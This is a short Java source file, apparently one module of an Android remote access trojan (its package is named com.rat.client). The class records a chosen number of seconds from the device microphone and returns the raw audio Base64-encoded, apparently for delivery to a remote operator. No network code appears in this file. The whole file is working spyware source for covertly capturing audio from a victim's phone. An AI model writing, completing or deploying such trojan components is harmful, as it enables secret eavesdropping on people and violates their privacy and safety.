package com.rat.client;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;

public class Mic {
    public static String record(Context ctx, int sec) {
        try {
            AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC,
                44100, AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, 44100 * 2);
            byte[] buf = new byte[44100 * 2 * sec];
            ar.startRecording();
            int off = 0;
            while (off < buf.length) {
                int r = ar.read(buf, off, buf.length - off);
                if (r <= 0) break;
                off += r;
            }
            ar.stop(); ar.release();
            return Base64.encodeToString(buf, Base64.DEFAULT);
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
